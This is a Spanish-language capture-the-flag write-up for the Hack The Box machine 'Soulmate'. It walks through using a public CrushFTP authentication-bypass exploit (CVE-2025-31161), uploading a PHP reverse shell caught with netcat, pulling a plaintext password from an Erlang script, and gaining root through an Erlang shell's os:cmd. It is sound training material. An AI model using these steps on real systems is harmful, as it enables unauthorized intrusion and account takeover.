
# Soulmate

<figure><img src="/files/Z31baiHFrd3XpsruQa1A" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Soulmate`
* **IP:** `10.10.11.86`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `15-09-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -A -T5 10.10.11.86
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

Solo encontramos 2 puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Al acceder a `http://soulmate.htb` parece que es una web de citas online.

<figure><img src="/files/AwB4c4RBZ0mXsPKZ4RE3" alt=""><figcaption></figcaption></figure>

Podríamos crear una cuenta y loguearnos:

<figure><img src="/files/AfQJHWf6KkQ4JcF2dLIU" alt=""><figcaption></figcaption></figure>

Al loguearnos solo encontramos interesante una funcionalidad para subida de archivos que podríamos intentar explotar:

<figure><img src="/files/4mpwRMsHuceZQuJtw1qq" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

Haremos fuzzing para buscar algún directorio de subida de archivos:

```bash
ffuf -u http://soulmate.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]
index.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 44ms]
```

Los archivos que subamos seguramente se almacenarían en el directorio assets, lo cual nos serviría para acceder a una reverse shell.

Pero antes de proceder a la explotación vamos a enumerar un poco más el host.

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.86 -H "Host: defnotvalid.soulmate.htb" | grep "Content-Length:"

Content-Length: 154
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.86/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
```

**Encontramos el subdominio:** `ftp.soulmate.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de login de `CrushFTP`:

<figure><img src="/files/crcieaqCfIhqd2PhS2Ag" alt=""><figcaption></figcaption></figure>

No tenemos credenciales para loguearnos, pero igual hay algún exploit públicos que nos sirva.

***

## <mark style="color:purple;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con CrushFTP en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

{% embed url="<https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation>" %}

Observamos que es vulnerable al CVE-2025-31161, y encontramos este PoC con el que podemos añadir un usuario al sistema:

{% embed url="<https://github.com/Immersive-Labs-Sec/CVE-2025-31161>" %}

### Ejecución del Exploit

```bash
python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user afsh4ck --password admin123

[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: afsh4ck
   [*] Password: admin123
```

Buum! Ya podemos loguearnos con las credenciales que le hemos indicado.

<figure><img src="/files/LFBChsQCESrDfDusGpGe" alt=""><figcaption></figcaption></figure>

No encontramos archivos, pero enumerando la aplicación encontramos un módulo de gestión de usuarios en Admin > User Manager:

<figure><img src="/files/jQznHuU7BPnCmrptHMZD" alt=""><figcaption></figcaption></figure>

Aquí podríamos cambiar la contraseña a los usuarios del sistema, para después loguearnos como ellos y subir una reverse shell.

Le pondremos a Ben la contraseña `admin1234`, y nos logueamos con este usuario:

<figure><img src="/files/9EpaJTu39FHRljctAD8D" alt=""><figcaption></figcaption></figure>

Aquí, subiremos una reverse shell al directorio webProd. Usaremos la de Pentest Monkey de revshells:

{% embed url="<https://www.revshells.com/>" %}

<figure><img src="/files/oAP3HKX3FBMMHfNJsf2a" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/kC8CltbjrWVLBNCGaSHa" alt=""><figcaption></figcaption></figure>

Ahora abrimos un listener de netcat, y accedemos a la siguiente url para iniciar la shell:

```
http://soulmate.htb/shell.php
```

Y recibimos al instante la shell:

```bash
nc -nlvp 4444

listening on [any] 4444 ...
connect to [10.10.14.226] from (UNKNOWN) [10.10.11.86] 34016
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 14:04:32 up  1:03,  1 user,  load average: 3.00, 2.51, 1.81
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ben      pts/1    10.10.16.28      13:25   17:28   0.26s  0.05s ssh -p 2222 ben@127.0.0.1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off

$ whoami
www-data
```

### Credential Hunting

Usaremos el siguiente script con el que encontramos un ejecutable interesante en `/etc/erlang_ssh/start.escript`

```bash
$ for l in $(echo ".escript .py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
-e 
File extension:  .escript
/etc/erlang_ssh/start.escript
-e 
File extension:  .py
/etc/python3.10/sitecustomize.py
-e 
File extension:  .pyc
-e 
File extension:  .pl
```

Vamos a leerlo con:

```bash
$ cat /usr/local/lib/erlang_login/start.escript

#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

Encontramos la contraseña de Ben:

```bash
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

Y algo curioso que encontramos es que el servicio SSH corre por el puerto 2222:

```bash
case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},
```

***

## <mark style="color:purple;">User Flag</mark>

Accedemos por SSH como Ben y su contraseña, y accedemos a la user flag:

```bash
ssh ben@soulmate.htb
                      
The authenticity of host 'soulmate.htb (10.10.11.86)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
ben@soulmate.htb's password: 
Last login: Mon Sep 15 14:37:34 2025 from 10.10.14.226

ben@soulmate:~$ whoami
ben

ben@soulmate:~$ ls
user.txt

ben@soulmate:~$ cat user.txt 
bbe0c1ddf1af25ccfb084112e*******
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No podemos ejecutar sudo, así que buscaremos otra vía:

```shell-session
ben@soulmate:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on soulmate.
```

### Ver servicios internos corriendo

Analizaremos el puerto interno SSH (2222) que nos ha llamado la atención, también tiene otros que pueden ser interesantes.

```shell-session
ben@soulmate:~$ ss -tuln

Netid   State    Recv-Q   Send-Q       Local Address:Port        Peer Address:Port   Process   
udp     UNCONN   0        0            127.0.0.53%lo:53               0.0.0.0:*                
tcp     LISTEN   0        4096             127.0.0.1:40329            0.0.0.0:*                
tcp     LISTEN   0        128              127.0.0.1:40925            0.0.0.0:*                
tcp     LISTEN   0        4096             127.0.0.1:8080             0.0.0.0:*                
tcp     LISTEN   0        4096             127.0.0.1:4369             0.0.0.0:*                
tcp     LISTEN   0        4096             127.0.0.1:8443             0.0.0.0:*                
tcp     LISTEN   0        5                127.0.0.1:2222             0.0.0.0:*                
tcp     LISTEN   0        511                0.0.0.0:80               0.0.0.0:*                
tcp     LISTEN   0        128                0.0.0.0:22               0.0.0.0:*                
tcp     LISTEN   0        4096         127.0.0.53%lo:53               0.0.0.0:*                
tcp     LISTEN   0        4096             127.0.0.1:9090             0.0.0.0:*                
tcp     LISTEN   0        511                   [::]:80                  [::]:*                
tcp     LISTEN   0        128                   [::]:22                  [::]:*                
tcp     LISTEN   0        4096                 [::1]:4369                [::]:*     
```

Nos conectamos por SSH de forma interna y accedemos al servicio de `ssh_runner`:

```shell-session
ben@soulmate:~$ ssh -p 2222 ben@127.0.0.1

The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)

(ssh_runner@soulmate)1> 
```

Y con el comando `help().` podemos sacar el menú de ayuda con todos los comandos que podemos ejecutar:

```shell-session
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
```

### Comprobar módulos cargados en SSH Runner

```
(ssh_runner@soulmate)2> m().

Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
atomics               preloaded
auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
<-----SNIP----->
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
```

Podemos usar directamente el módulo del sistema operativo para ejecutar comandos y descubrimos que ya tiene permisos de root.

```bash
(ssh_runner@soulmate)3> os:cmd("id").

"uid=0(root) gid=0(root) groups=0(root)\n"
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
(ssh_runner@soulmate)4> os:cmd("cat /root/root.txt").

"630c64bdcc8c20e4447f284f3*******"
```
